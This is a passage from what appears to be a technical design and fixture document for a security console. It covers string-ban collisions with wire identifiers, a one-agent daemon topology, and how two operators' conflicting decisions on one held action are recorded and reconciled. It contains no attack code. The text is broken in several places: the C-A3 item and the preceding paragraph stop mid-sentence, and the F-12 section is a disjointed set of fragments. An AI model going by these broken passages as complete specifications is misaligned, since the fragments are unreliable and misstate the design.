still fails. The ban list's own message field carries the argument, which is the
right place for it — the exemption is not a softening, it is the line between
the product claiming an authority and the product quoting one.

One limit the ban list now states in its own header and this document should
repeat rather than let a green line imply otherwise: **nothing in that scanner
covers a string that arrives as data.** It reads authored literals. A
daemon-supplied string interpolated into a rendered slot is invisible to every
row, always. That is `INV-14`'s problem — the `AdversaryText` brand and
`<AdversaryString>` — not the copy gate's, and it is exactly why the `approve`
exemption had to exist at all.

**Two more identifier-class collisions found the same way**, both by running
`fixtures/demo/check-strings.mjs` over this document:

- **C-A1 — `hunt-noun` vs. the product's own event ids.** Every telemetry event
  id in the shipped scenarios begins `hunt-`, and every `finding_id`,
  `capability_id` and `receipt_id` embeds one. The row's exempt was `hunt_id`
  only, so `lease:hunt-evt-1:isolate_host:…` failed a hygiene ban on a noun it
  does not contain. **LANDED**, exempt is now `hunt_id|hunt[_-][a-z0-9]`.
- **C-A3 — `bare-lease` vs. the capability-id format.** `capability_id` is

  `lease:` joins the four identifier tokens the row already exempted.

All three are the same class of defect: a ban written against prose applied to a
string that is a wire identifier. None of them is a reason to soften the ban, and
none was findable by reading — only by running it, which is why
`fixtures/demo/check-strings.mjs` exists rather than a promise that the copy is

### F-12 — two adjacent structs, one field name, two wire shapes (new, corrects this fixture)

`ContainmentLease` serializes `into = "ContainmentLeaseRecord"`

never produces — so any decoder tested only against the fixture would never
exercise the absent-key path that is the actual shipped default (no governance
receipt is minted on this path at all). **Fixed:** `card-10` no longer carries

identically-named `governance_receipt_id`

### F-13 — one Whisker, one slot, forever (new)

Every one of the eight `register_persisted_runtime_agent` calls in
`AMB crates/swarm-runtime-http/src/bin/swarm_detect.rs` passes the slot literal
`"primary"`, and no second slot appears anywhere in the binary. A shipped daemon
therefore runs **exactly one** detecting agent, whatever its ruleset says. Every
lane in §4.1 reads `N sources / 1 agent` as a direct consequence — which is not
a fixture artefact to design around but the shipped topology, and it is exactly
the reading that render law 2's expansion exists to prevent an operator making.
A wall drawn from a roster of eight busy agents is drawing a deployment nobody
can currently configure.

## 12.1 The `contested` variant — two consoles, one hold

Nothing in the wave-2 set handled two operators deciding one hold, and the hole
is structural rather than hypothetical. Appendix §4 layer 1 `p`-tags **every**
principal holding `OperatorScope::Approve`, and `00-BRIEF.md` §13's declined-
amendment note confirms the watch claim does not narrow that set. So a deployment
with two Approve principals delivers one hold to two consoles, by design.

What happens next is decided in two places that do not talk to each other.
`12-BACKEND-BILL-API.md` §4.4 resolves the daemon: `HeldActionStore::begin_decision`
is a compare-and-set, exactly one decision runs, and the loser gets a
`409 hold_already_deciding` / `hold_already_decided`. But **leg 1 is published to
the relay before leg 2 is POSTed**, the relay has no compare-and-set, and a
`kind:9` event is immutable. Both signed intent cards land in the case channel and
stay there forever. Before this revision `leg2.state`'s enum ran
`sending | recorded | acknowledged | refused_late` — there was no value meaning
"another operator's decision was the one that executed", so the Ledger export's
`holds/` directory would contain **two unqualified human-decision records for one
hold** with nothing marking the loser.

`13-WIRE-SCHEMAS.md` has since added the fifth value. This fixture supplies the
data that makes it testable:

| File | What it is |
|---|---|
| `wire/variant-contested-event-46010-hold-b-two-principals.json` | the notice with **two** `p` tags — the configuration that makes the contest possible |
| `wire/variant-contested-01-verdict-op2-wins.json` | operator 2's leg 1, `leg2.state: "acknowledged"` |
| `wire/variant-contested-02-verdict-op1-sending.json` | operator 1's leg 1, published 400 ms later, `leg2.state: "sending"` — because at publish time it did not yet know it had lost |
| `wire/variant-contested-03-verdict-op1-superseded.json` | operator 1's **update** card, `leg2.state: "superseded"`, carrying `superseded_by` and `superseded_at_ms` |
| `http/variant-contested-POST-…-hold-b-decide-409.json` | the 409 body, naming `decided_nostr_intent_event_id` — the only input from which a losing console can fill `superseded_by` |

Three properties are worth stating because a producer will otherwise get one of
them wrong.

**`superseded` is the console's obligation, not the daemon's.** The losing
console is the only party that knows both which card it published and which 409
it received. The daemon knows the winner and does not know the loser published
anything at all.

**The schema makes the pairing unrepresentable-if-wrong.** `leg2`'s `oneOf`
requires `superseded_by` **and** `superseded_at_ms` exactly when
`state === "superseded"`, and requires both to be `null` for the other four
states. A console cannot record "somebody else won" without saying who.

**A reader who never sees the third card must still reach the right rendering.**
That is the reconciliation rule, carried as data in
`variants.contested.reconciliation_rule` so two producers do not implement it
twice and differently:

> A `kind:9` `ambush:verdict:v1` card whose `hold_id` matches a hold the daemon
> reports as decided, but whose Nostr event id is **not** the decision record's
> `nostr_intent_event_id`, renders as a human intent record that did not become
> the decision — never as the decision.

The `superseded` card is the fast, offline-readable path; the reconciliation rule
is the floor that holds when the losing console closed its window before it could
publish. Both are needed: without the card the Ledger export is ambiguous
offline, and without the rule a crashed console leaves a permanent ambiguity.

`seedPerchDemo(page, { contested: true })` seeds all three cards;
`perchDaemonRoutes(page, …, { outcome: "contested" })` serves the 409 with status
409 and a JSON body, because a conflict is a normal outcome carrying a rule name,
not a transport error.

**What this fixture does not do about it.** It does not write the two-console
E2E, define the invariant number, or decide whether a superseded card renders in
the case timeline or only in the Ledger. Those belong to `16-INVARIANT-TESTS.md`
and `17-COMPONENT-SPECS.md`. The data is here so neither has to invent it.
